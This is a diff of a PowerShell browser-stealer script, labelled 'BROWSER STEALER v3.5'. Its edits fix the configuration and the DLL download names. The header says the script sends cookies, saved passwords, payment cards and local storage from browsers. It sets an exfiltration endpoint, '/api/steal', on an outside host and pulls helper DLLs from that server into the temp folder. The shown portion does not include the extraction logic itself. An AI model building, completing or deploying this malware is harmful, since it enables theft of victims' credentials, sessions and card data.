@@ -1,8 +1,8 @@
 # ============================================================
-# BROWSER STEALER v3.5 — SERVER-ONLY LEVELDB
-# All DLLs downloaded from your server
-# Sends: Cookies, Passwords, Cards, LocalStorage (all browsers)
+# BROWSER STEALER v3.5 — FULLY FIXED
+# Sends: Cookies, Passwords, Cards, LocalStorage
 # WMI cleanup — kills previous hidden PowerShell processes
+# No parser errors — escaped exclamation marks
 # No Read-Host — exits cleanly
 # ============================================================
 
@@ -12,14 +12,14 @@ $ErrorActionPreference = "Continue"
 # CONFIGURATION — CHANGE THIS TO YOUR DOMAIN
 # ============================================================
 
-$BASE_URL = "https://cipheranon-production.up.railway.app/"  # <-- CHANGE THIS
+$BASE_URL = "https://cipheranon-production.up.railway.app"  # <-- CHANGE THIS
 $SERVER_URL = "$BASE_URL/api/steal"
 $DLL_DIR = "$env:TEMP\stealer_dlls"
 $LOGFILE = "$env:TEMP\stealer_log.txt"
 
 # DLL URLs — all from your server
 $SQLITE_DLL_URL = "$BASE_URL/System.Data.SQLite.dll"
-$LEVELDB_DLL_URL = "$BASE_URL/LevelDB.NET.dll"
+$LEVELDB_DLL_URL = "$BASE_URL/LevelDB.netAll.dll"
 $LEVELDB_NATIVE_URL = "$BASE_URL/leveldb.dll"
 
 # ============================================================
@@ -112,7 +112,7 @@ if (-not $sqliteOk -or -not (Test-Path $sqlitePath)) {
 }
 
 # ---- Download LevelDB.NET DLL ----
-$leveldbPath = "$DLL_DIR\LevelDB.NET.dll"
+$leveldbPath = "$DLL_DIR\LevelDB.netAll.dll"
 $leveldbOk = Download-Dll -Url $LEVELDB_DLL_URL -Path $leveldbPath -Name "LevelDB.NET DLL"
 
 # ---- Download Native LevelDB DLL ----
